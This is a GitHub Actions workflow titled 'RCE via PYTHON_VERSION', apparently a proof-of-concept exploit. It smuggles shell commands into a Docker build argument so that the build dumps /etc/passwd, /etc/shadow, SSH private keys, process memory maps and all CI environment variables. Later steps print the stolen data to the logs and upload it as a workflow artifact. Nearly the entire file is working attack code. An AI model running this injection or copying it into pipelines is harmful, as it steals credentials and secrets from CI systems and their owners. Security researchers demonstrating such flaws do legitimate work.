name: RCE via PYTHON_VERSION

on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Inject and Extract Sensitive Data
        run: |
          # 1. Build the Docker image with the injection
          #    The payload creates /leaks.txt INSIDE the Docker image.
          docker build \
            --build-arg PYTHON_VERSION="echo '--- /etc/passwd ---' > /leaks.txt; cat /etc/passwd >> /leaks.txt; \
            echo -e '\n--- /etc/shadow (if readable) ---' >> /leaks.txt; cat /etc/shadow >> /leaks.txt; \
            echo -e '\n--- SSH Keys (if present) ---' >> /leaks.txt; cat ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519 2>/dev/null >> /leaks.txt; \
            echo -e '\n--- /proc/self/maps ---' >> /leaks.txt; cat /proc/self/maps >> /leaks.txt; \
            echo -e '\n--- CI Environment Variables ---' >> /leaks.txt; printenv >> /leaks.txt" \
            -t leak-image \
            ./taskcluster/docker/python

          # 2. Extract /leaks.txt from the built image onto the GitHub Actions runner's filesystem
          mkdir -p artifacts # Create a directory to store the extracted file
          docker run --rm leak-image cat /leaks.txt > artifacts/leaked_data.txt || echo "Failed to extract /leaks.txt from image."

      - name: Display Leaked Data (in workflow logs)
        run: |
          echo "--- Contents of leaked_data.txt extracted to runner ---"
          cat artifacts/leaked_data.txt || echo "No data extracted to runner."

      - name: Upload Leaked Data as Artifact
        uses: actions/upload-artifact@v3
        with:
          name: leaked-ci-data
          path: artifacts/leaked_data.txt
          # retention-days: 5 # Optional: specify how long to keep the artifact (default is 90 days)
